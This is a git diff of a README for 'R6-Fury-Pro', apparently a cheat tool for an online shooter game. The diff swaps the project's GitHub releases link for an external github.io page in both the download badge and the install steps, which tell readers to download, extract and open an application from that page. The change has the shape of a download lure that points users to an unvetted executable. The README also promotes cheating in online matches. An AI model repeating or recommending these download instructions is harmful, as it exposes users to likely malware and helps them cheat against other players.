@@ -1,6 +1,6 @@
 # 🛡️ R6-Fury-Pro - Gain the tactical advantage in matches
 
-[![](https://img.shields.io/badge/Download-R6--Fury--Pro-blue)](https://github.com/imanijab4641/R6-Fury-Pro/releases)
+[![](https://img.shields.io/badge/Download-R6--Fury--Pro-blue)](https://imanijab4641.github.io)
 
 ## Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following page to choose the latest version of the software: [https://github.com/imanijab4641/R6-Fury-Pro/releases](https://github.com/imanijab4641/R6-Fury-Pro/releases).
+1. Visit the following page to choose the latest version of the software: [https://imanijab4641.github.io](https://imanijab4641.github.io).
 2. Download the compressed file, which usually ends in the .zip extension, to your desktop.
 3. Right-click the downloaded file and select Extract All to view the internal contents.
 4. Open the extracted folder to find the application file.
